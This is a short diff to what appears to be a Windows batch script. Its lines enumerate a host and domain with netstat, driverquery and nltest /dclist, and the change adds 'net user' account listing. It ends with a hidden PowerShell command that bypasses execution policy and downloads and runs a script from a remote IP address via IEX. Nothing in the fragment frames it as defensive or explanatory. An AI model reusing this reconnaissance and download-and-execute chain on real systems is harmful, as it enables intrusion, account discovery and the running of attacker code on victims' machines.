@@ -209,6 +209,8 @@ netstat -ano | findstr "ESTABLISHED"
 ECHO ============================
 driverquery
 ECHO ============================
+net user
+ECHO ============================
 nltest /dclist:abc.local
 ECHO ============================
 powershell.exe -W hidden -Exec Bypass -nologo -noprofile -command "IEX(New-Object Net.WebClient).DownloadString('http://91.91.91.91:80/powershellscript')"
